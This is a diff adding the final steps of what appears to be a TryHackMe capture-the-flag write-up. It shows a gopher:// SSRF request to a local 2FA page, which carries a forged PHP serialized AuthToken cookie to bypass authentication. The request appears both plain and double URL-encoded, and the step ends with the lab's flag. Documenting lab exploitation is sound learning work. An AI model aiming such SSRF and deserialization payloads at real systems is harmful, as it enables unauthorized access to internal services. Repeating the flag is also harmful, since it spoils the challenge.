@@ -234,3 +234,25 @@ O:9:"AuthToken":1:{s:9:"validated";b:1;}
 
 ![cookie after](images/24-after.png)
 
+25. Preparing a request and sending it with `gopher://` should look like: 🎯
+```
+gopher://127.0.0.1:80/_GET /management/2fa.php HTTP/1.1
+Host: 127.0.0.1
+Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D; PHPSESSID=u8todb9p9lq3r4jnup573sk6pf;
+
+```
+
+![final goph](images/25-goph.png)
+
+```
+gopher://127.0.0.1:80/_GET%2520/management/2fa.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%250D%250ACookie:%2520auth_token=O%25253A9%25253A%252522AuthToken%252522%25253A1%25253A%25257Bs%25253A9%25253A%252522validated%252522%25253Bb%25253A1%25253B%25257D;%2520PHPSESSID=u8todb9p9lq3r4jnup573sk6pf;%250D%250A
+```
+
+26. Finally, Flag 2 ⛳️!
+```
+THM{804326748394ff9fb288e059653f0db7}
+```
+
+![fin burp](images/26-burp.png)
+![fin flag](images/26-final-flag.png)
+
